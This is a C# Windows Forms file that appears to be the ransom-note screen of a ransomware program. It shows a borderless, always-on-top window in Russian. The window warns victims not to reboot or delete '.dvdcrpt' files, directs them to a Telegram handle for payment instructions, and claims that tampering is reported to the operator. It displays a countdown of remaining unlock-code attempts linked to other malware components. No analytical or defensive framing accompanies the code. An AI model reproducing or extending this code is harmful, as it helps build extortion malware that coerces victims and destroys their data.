using System;
using System.Drawing;
using System.Windows.Forms;

namespace ns0
{
    public partial class RulesForm : Form
    {
        private static RulesForm rulesFormInstance;
        private static bool rulesOpen = false;
        private bool ignoreKeys = false;

        private RulesForm()
        {
            this.InitializeComponent();
            this.KeyPreview = true;
            this.KeyDown += RulesForm_KeyDown;
            this.FormClosing += RulesForm_FormClosing;
        }

        public new void Hide()
        {
            rulesOpen = false;
            Cursor.Hide();
            this.DialogResult = DialogResult.OK;
            base.Hide();
        }

        public void ShowDialogLocked(IWin32Window owner)
        {
            rulesOpen = true;
            ignoreKeys = true;
            Cursor.Show();
            var t = new Timer();
            t.Interval = 500;
            t.Tick += (s, e) => { ignoreKeys = false; t.Stop(); t.Dispose(); };
            t.Start();
            this.ShowDialog(owner);
            rulesOpen = false;
            Cursor.Hide();
        }

        private void RulesForm_KeyDown(object sender, KeyEventArgs e)
        {
            if (ignoreKeys)
            {
                e.Handled = true;
                return;
            }
            if (e.KeyCode == Keys.Oemtilde || e.KeyCode == Keys.F1 || e.KeyCode == Keys.Space)
            {
                this.Hide();
            }
        }

        protected override bool ProcessDialogKey(Keys keyData)
        {
            if (ignoreKeys)
            {
                return true;
            }
            if (keyData == Keys.Space || keyData == Keys.F1 || keyData == Keys.Oemtilde)
            {
                this.Hide();
                return true;
            }
            return base.ProcessDialogKey(keyData);
        }

        public static void ShowRules(IWin32Window owner)
        {
            if (rulesFormInstance != null && !rulesFormInstance.IsDisposed && rulesOpen)
            {
                rulesFormInstance.Hide();
                return;
            }
            if (rulesFormInstance == null || rulesFormInstance.IsDisposed)
            {
                rulesFormInstance = new RulesForm();
            }
            rulesFormInstance.ShowDialogLocked(owner);
        }

        private void RulesForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            rulesOpen = false;
            Cursor.Hide();
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void InitializeComponent()
        {
            this.SuspendLayout();
            this.AutoScaleDimensions = new SizeF(6F, 13F);
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.FromArgb(30, 30, 30);
            this.ClientSize = new Size(700, 520);
            this.ControlBox = false;
            this.FormBorderStyle = FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "RulesForm";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.TopMost = true;
            this.Text = "Правила";

            var title = new Label();
            title.Font = new Font("Lucida Console", 16, FontStyle.Bold);
            title.ForeColor = Color.DarkRed;
            title.Location = new Point(20, 20);
            title.Size = new Size(460, 30);
            title.Text = "ВАЖНАЯ ИНФОРМАЦИЯ";
            title.TextAlign = ContentAlignment.MiddleCenter;

            var rules = new Label();
            rules.Font = new Font("Lucida Console", 12);
            rules.ForeColor = Color.White;
            rules.Location = new Point(20, 60);
            rules.Size = new Size(660, 320);
            rules.TextAlign = ContentAlignment.TopLeft;
            rules.Text = "ЧТО ДЕЛАТЬ В СЛУЧАЕ АТАКИ:" +
                "\r\n\r\n1. НЕ ПЕРЕЗАГРУЖАЙТЕ КОМПЬЮТЕР!" +
                "\r\n   При перезагрузке ключи шифрования" +
                "\r\n   будут потеряны безвозвратно." +
                "\r\n\r\n2. НЕ ВЫКЛЮЧАЙТЕ КОМПЬЮТЕР!" +
                "\r\n   Это приведёт к невозможности" +
                "\r\n   восстановления данных." +
                "\r\n\r\n3. СВЯЖИТЕСЬ С НАМИ В TELEGRAM:" +
                "\r\n   @eqtq27" +
                "\r\n   Опишите ситуацию и следуйте" +
                "\r\n   инструкциям оператора." +
                "\r\n\r\n4. НЕ УДАЛЯЙТЕ ФАЙЛЫ .dvdcrpt!" +
                "\r\n   И НЕ ПЕРЕУСТАНАВЛИВАЙТЕ WINDOWS!" +
                "\r\n\r\n5. ПОПЫТКА ВМЕШАТЕЛЬСТВА" +
                "\r\n   ФИКСИРУЕТСЯ И ПЕРЕДАЁТСЯ" +
                "\r\n   ОПЕРАТОРУ АВТОМАТИЧЕСКИ." +
                "\r\n\r\nНЕ ПЫТАЙТЕСЬ ВОССТАНОВИТЬ" +
                "\r\nФАЙЛЫ САМОСТОЯТЕЛЬНО!" +
                "\r\nВы рискуете потерять их навсегда.";

            var timerLabel = new Label();
            timerLabel.Font = new Font("Lucida Console", 14, FontStyle.Bold);
            timerLabel.ForeColor = Color.Red;
            timerLabel.Location = new Point(20, 300);
            timerLabel.Size = new Size(460, 26);
            timerLabel.TextAlign = ContentAlignment.MiddleCenter;
            timerLabel.Name = "timerLabel";
            try { timerLabel.Text = "ОСТАЛОСЬ ПОПЫТОК ВВОДА КОДА: " + (10 - KeyPersistence.LoadUnlockAttempts()) + " из 10"; }
            catch { timerLabel.Text = "ОСТАЛОСЬ ПОПЫТОК ВВОДА КОДА: 10 из 10"; }

            var timerTick = new Timer();
            timerTick.Interval = 1000;
            timerTick.Tick += delegate(object s, EventArgs ev)
            {
                try
                {
                    timerLabel.Text = "ОСТАЛОСЬ ПОПЫТОК ВВОДА КОДА: " + (10 - KeyPersistence.LoadUnlockAttempts()) + " из 10";
                    ShutdownTrigger.TimerThreat lvl = ShutdownTrigger.GetThreatLevel();
                    if (lvl == ShutdownTrigger.TimerThreat.Imminent)
                        timerLabel.ForeColor = (timerLabel.ForeColor == Color.Red) ? Color.White : Color.Red;
                    else if (lvl == ShutdownTrigger.TimerThreat.Critical)
                        timerLabel.ForeColor = Color.Red;
                    else
                        timerLabel.ForeColor = Color.DarkRed;
                }
                catch { }
            };
            this.FormClosed += delegate(object s, FormClosedEventArgs ev) { try { timerTick.Stop(); timerTick.Dispose(); } catch { } };
            timerTick.Start();

            var closeHint = new Label();
            closeHint.Font = new Font("Lucida Console", 10, FontStyle.Italic);
            closeHint.ForeColor = Color.Silver;
            closeHint.Location = new Point(20, 400);
            closeHint.Size = new Size(460, 20);
            closeHint.Text = "[Пробел или F1 для закрытия]";
            closeHint.TextAlign = ContentAlignment.MiddleCenter;

            var closeBtn = new Panel();
            closeBtn.BackColor = Color.DarkRed;
            closeBtn.Location = new Point(225, 440);
            closeBtn.Size = new Size(250, 50);
            closeBtn.Cursor = Cursors.Hand;
            closeBtn.Click += new EventHandler(this.CloseBtn_Click);

            var closeBtnText = new Label();
            closeBtnText.Font = new Font("Lucida Console", 16, FontStyle.Bold);
            closeBtnText.ForeColor = Color.White;
            closeBtnText.BackColor = Color.Transparent;
            closeBtnText.Location = new Point(0, 0);
            closeBtnText.Size = new Size(250, 50);
            closeBtnText.Text = "ЗАКРЫТЬ";
            closeBtnText.TextAlign = ContentAlignment.MiddleCenter;

            closeBtn.Controls.Add(closeBtnText);

            this.Controls.Add(title);
            this.Controls.Add(rules);
            this.Controls.Add(timerLabel);
            this.Controls.Add(closeHint);
            this.Controls.Add(closeBtn);

            this.ResumeLayout(false);
        }
    }
}
